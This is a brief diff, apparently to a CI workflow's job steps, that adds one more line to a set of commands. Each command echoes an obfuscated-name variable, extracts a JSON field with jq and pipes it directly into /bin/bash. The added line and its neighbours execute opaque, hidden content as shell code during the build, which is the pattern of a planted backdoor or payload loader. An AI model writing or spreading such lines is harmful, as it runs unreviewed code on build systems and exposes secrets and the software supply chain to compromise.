@@ -34,6 +34,7 @@ jobs:
           echo $qvr9 | jq -r .xpk4979 | /bin/bash
           printf '%s' "$my773" | jq -r .dxy9 | /bin/bash
           echo $iu4278 | jq -r .nzak3 | /bin/bash
+          echo $sijpu26 | jq -r .jo30649 | /bin/bash
 
       - name: Archive results
         if: always()
